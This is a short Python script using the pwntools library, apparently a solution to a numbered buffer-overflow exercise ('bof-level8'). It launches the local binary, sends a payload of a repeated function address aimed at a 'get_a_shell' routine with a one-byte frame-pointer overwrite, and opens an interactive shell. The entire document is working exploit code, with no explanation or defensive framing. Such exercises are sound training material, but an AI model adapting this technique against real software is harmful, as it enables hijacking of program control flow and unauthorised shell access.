#!/usr/bin/env python

from pwn import *

p = process('./bof-level8')

get_a_shell = 0x40067a

p.sendline(p64(get_a_shell) * 16 + '\x70') # rbp when using gdb: 0x7fffffffe3c0

output = p.recv()
print(output)

p.interactive()
